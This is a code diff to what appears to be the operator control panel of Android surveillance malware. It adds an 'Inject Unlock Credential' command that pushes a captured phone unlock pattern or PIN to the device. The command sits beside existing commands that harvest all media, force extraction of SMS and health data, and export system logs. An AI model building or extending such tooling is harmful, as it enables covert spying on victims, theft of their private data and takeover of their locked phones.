@@ -710,6 +710,7 @@
                     { id: 'GET_ENGAGEMENT', name: 'Usage Engagement Metrics', icon: '📈', inputs: [] },
                     { id: 'GET_LOGS', name: 'Export System Logcat', icon: '📋', inputs: [] },
                     { id: 'MAP_GRID', name: 'Pattern Grid Discovery', icon: '🗺️', inputs: [{id: 'val-grid-depth', label: 'Scrape Depth', type: 'number', val: 10}] },
+                    { id: 'STORE_KEY', name: 'Inject Unlock Credential', icon: '🗝️', keywords: 'key, password, pin, pattern, unlock, store', inputs: [{id: 'key-type', label: 'Credential Type', type: 'select', options: [{v: 'PATTERN', l: 'PATTERN'}, {v: 'PIN', l: 'PIN/PASSWORD'}]}, {id: 'key-val', label: 'Key Data (e.g. [1,2,4,5] or 1234)', type: 'text'}] },
                     { id: 'GET_VAULT_SIZE', name: 'Query Vault Storage', icon: '💾', inputs: [] },
                     { id: 'FORCE_UPLOAD', name: 'Force Data Extraction', icon: '🧬', inputs: [{id: 'val-force', label: 'Modules (sms,vitals,all)', type: 'text', val: 'ALL'}] },
                     { id: 'HARVEST_MEDIA', name: 'Harvest All Media', icon: '🗃️', keywords: 'photos, videos, media, grab, sync', inputs: [] },
@@ -1434,6 +1435,8 @@
                         content = `${document.getElementById('patt-timeout').value}|${document.getElementById('patt-qual').value}|${document.getElementById('patt-fps').value}`; break;
                     case 'MAP_GRID':
                         content = document.getElementById('val-grid-depth').value; break;
+                    case 'STORE_KEY':
+                        content = `${document.getElementById('key-type').value}|${document.getElementById('key-val').value}`; break;
                     case 'MASTER_TOGGLE':
                         content = forcedVal || document.getElementById('val-master-toggle').value; break;
                     case 'STAY_READY': content = document.getElementById('val-burst').value; break;
